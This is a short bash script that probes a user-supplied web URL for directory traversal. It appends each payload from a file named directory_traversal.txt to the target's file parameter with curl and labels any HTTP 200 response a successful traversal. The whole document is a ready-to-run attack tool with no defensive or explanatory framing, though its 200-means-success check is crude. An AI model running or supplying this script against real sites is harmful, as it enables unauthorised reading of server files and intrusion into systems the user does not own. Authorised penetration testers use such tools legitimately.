#!/bin/bash

# Prompt user for target URL input
read -p "Enter the target URL (e.g., http://example.com/page.php?file=): " TARGET_URL

# Read payloads from traversal.txt
PAYLOADS_FILE="directory_traversal.txt"
PAYLOADS=$(cat "$PAYLOADS_FILE")

# Loop through each payload
for PAYLOAD in $PAYLOADS; do
    # Send HTTP request with the payload appended
    RESPONSE=$(curl -s -o /dev/null -w "%{http_code}" "${TARGET_URL}${PAYLOAD}")

    # Check if response indicates successful traversal
    if [[ "$RESPONSE" == "200" ]]; then
        echo "Payload '$PAYLOAD' successful"
    else
        echo "Payload '$PAYLOAD' failed with HTTP response code $RESPONSE"
    fi
done

